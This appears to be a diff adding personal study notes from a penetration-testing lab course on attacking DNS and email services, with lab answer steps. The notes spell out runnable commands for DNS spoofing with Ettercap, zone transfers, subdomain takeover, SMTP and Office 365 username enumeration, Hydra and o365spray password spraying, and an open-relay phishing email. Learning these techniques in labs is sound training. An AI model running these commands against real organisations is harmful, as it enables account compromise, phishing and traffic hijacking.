@@ -767,3 +767,145 @@ DNS spoofing (DNS cache poisoning) replaces legitimate DNS records with false on
 -From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.
 https://www.ettercap-project.org/
 https://www.bettercap.org/
+-To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
+$cat /etc/ettercap/etter.dns
+inlanefreight.com A 192.168.225.110
+*.inlanefreight.com A 192.168.225.110
+
+-Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2
+-Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
+-After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:
+In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well:
+
+<test>Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.
+$ git clone https://github.com/TheRook/subbrute.git && cd subbrute/
+echo STMIP > resolvers.txt
+$ python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt
+$ dig axfr hr.inlanefreight.htb @10.129.137.154 | grep "TXT"
+
+\\Lastest DNS Vulnerabilities
+The Concept of the Attack
+-If a CNAME in the company DNS points to a subdomain that no longer exists (returns HTTP 404), we can register that missing target with the third-party provider and take over the subdomain. Once we claim the nonexistent domain and make one DNS change, the subdomain resolves to our registration and we control it.
+
+\\The Concept of Attacks
+-Initiation of Subdomain Takeover
+Step	Subdomain Takeover	Concept of Attacks - Category
+1.	The source, in this case, is the subdomain name that is no longer used by the company that we discovered.	Source
+2.	The registration of this subdomain on the third-party provider's site is done by registering and linking to own sources.	Process
+3.	Here, the privileges lie with the primary domain owner and its entries in its DNS servers. In most cases, the third-party provider is not responsible for whether this subdomain is accessible via others.	Privileges
+4.	The successful registration and linking are done on our server, which is the destination in this case.	Destination
+This is when the cycle starts all over again, but this time to trigger the forwarding to the server we control.
+
+Trigger the Forwarding
+Step	Subdomain Takeover	Concept of Attacks - Category
+5.	The visitor of the subdomain enters the URL in his browser, and the outdated DNS record (CNAME) that has not been removed is used as the source.	Source
+6.	The DNS server looks in its list to see if it has knowledge about this subdomain and if so, the user is redirected to the corresponding subdomain (which is controlled by us).	Process
+7.	The privileges for this already lie with the administrators who manage the domain, as only they are authorized to change the domain and its DNS servers. Since this subdomain is in the list, the DNS server considers the subdomain as trustworthy and forwards the visitor.	Privileges
+8.	The destination here is the person who requests the IP address of the subdomain where they want to be forwarded via the network.	Destination
+-Subdomain takeover can be used not only for phishing but also for many other attacks. These include, for example, stealing cookies, cross-site request forgery (CSRF), abusing CORS, and defeating content security policy (CSP). We can see some examples of subdomain takeovers on the HackerOne website, which have earned the bug bounty hunters considerable payouts.
+
+\\\\\\\\\\========================================
+Attacking Email service
+-A mail server handles sending, receiving and storing email over a network. Clients (computers, phones) send mail to an SMTP (Simple Mail Transfer Protocol) server when the user hits Send; SMTP also transfers mail between servers. To download mail, clients connect to POP3 or IMAP4 servers: POP3 typically removes messages from the server after download (though it can be configured to keep copies), making multi-device access harder; IMAP4 leaves messages on the server by default, enabling easy multi-device access. Next: how attackers can target mail servers.
+\\Enumeration
+-Email infrastructure is complex — multiple servers, ports and services — and many organizations host email in cloud providers like Microsoft 365 or Google Workspace, so the attack method depends on the service. Use the domain's MX (Mail eXchanger) DNS records to find the mail servers (there can be multiple for redundancy/load-balancing). Query MX records with tools like dig/host or online services such as MXToolbox.
+-We can use the Mail eXchanger (MX) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.
+
+\\Host - MX records
+$host -t MX hackthebox.eu 
+$host -t MX microsoft.com
+
+\\DIG - MX Records 
+$dig mx plaintext.do | grep "MX" | grep -v ";"
+$dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+\\HOST - A Records 
+$host -t A mail1.inlanefreight.htb
+-The MX records show three cloud providers — Google (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) and Zoho (mx.zoho.com) — plus a possible company-hosted mail server. That matters because enumeration and attacks differ by provider: cloud services use provider-specific implementations and modern auth (introducing unique attack vectors), while self-hosted servers can expose misconfigurations and classic protocol weaknesses. If targeting a custom mail server (e.g. inlanefreight.htb) enumerate common mail/webmail ports such as:
+SMTP/submission: 25, 587, 465
+IMAP/IMAPS: 143, 993
+POP3/POP3S: 110, 995
+Webmail/OWA/API/ActiveSync: 80, 443
+Mail filtering/management (optional): 4190 (ManageSieve) and other service ports.
+Port	Service
+TCP/25	SMTP Unencrypted
+TCP/143	IMAP4 Unencrypted
+TCP/110	POP3 Unencrypted
+TCP/465	SMTP Encrypted
+TCP/587	SMTP Encrypted/STARTTLS
+TCP/993	IMAP4 Encrypted
+TCP/995	POP3 Encrypted
+-We can use Nmap's default script -sC option to enumerate those ports on the target system:
+$sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+
+\\Misconfiguration
+Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.
+
+\\Authentication
+VRFY asks an SMTP server whether a specific username exists; the server replies if the user is valid or not. If enumeration succeeds (via VRFY, EXPN, RCPT TO, etc.), attackers can perform password spraying, brute force, or guessing — note that VRFY may be disabled.
+
+\\VRFY Command
+$telnet 10.10.110.20 25
+VRFY root 
+VRFY www-data
+VRFY new-user
+EXPN is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."
+
+\\EXPN Command
+$telnet 10.10.110.20 25
+EXPN john
+EXPN support-team 
+-RCPT TO identifies the recipient of the email message. this command can be repeated multiple times for a given message to deliver a single message to multiple recipient
+
+\\RCPT TO command
+$telnet 10.10.110.20 25
+MAIL FROM:test@htb.com
+RCPT TO:julio 
+RCPT TO:kate
+RCPT TO:john
+e can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command USER followed by the username, and if the server responds OK. This means that the user exists on the server.
+
+\\USER Command
+$telnet 10.10.110.20 110
+USER julio
+USER john
+-Use smtp-user-enum to automate username enumeration.
+Flags: -M (mode: VRFY/EXPN/RCPT), -U (file with usernames), -D (domain, if required), and -t (target SMTP host).
+Depending on server and mode, discovered valid users enable password-spray, brute-force or guessing attempts.
+
+$smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+\\Cloud Enumeration
+Cloud providers add proprietary features that can be abused for username enumeration — Office 365 is a good example. O365spray (by ZDH) is a username-enumeration and password-spray tool for Microsoft 365 that implements several researched techniques. First step: verify whether the target domain is using Office 365.
+
+\\O365 Spray
+$python3 o365spray.py --validate --domain msplaintext.xyz
+identify usernames
+$python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+
+\\Password Attack
+We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3.
+
+\\Hydra - Password Attack
+$hydra -L users.txt -p 'Company01!' -f 10.10.110.20 POP3
+-If cloud providers expose SMTP/POP3/IMAP4, password-spraying with tools like Hydra may work but is often blocked. Use provider-specific tools instead — e.g. o365spray or MailSniper for Microsoft 365, CredKing for Gmail/Okta. Keep tools up-to-date and understand their internals so you can modify them when providers change their services.
+\\o365 spray - password spraying
+$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+\\Protocol Specifies Attacks
+An open relay is a Simple Mail Transfer Protocol (SMTP) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
+\\Open relay
+$nmap -p25 -Pn --script smtp-open-replay 10.10.11.213
+-Next, we can use any mail client to connect to the mail server and send our email.
+$# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+
+<test>"What is the available username for domain inlanefreight.htb in the SMTP server?"
+$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
+<test>
+"Access the email account using the user credentials that you discovered and submit the flag in the email as your answer
+$hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://STMIP -f
+
+telnet STMIP 143
+11 login "marlin@inlanefreight.htb" "poohbear"
+12 select "INBOX"
+13 FETCH 1 BODY[]
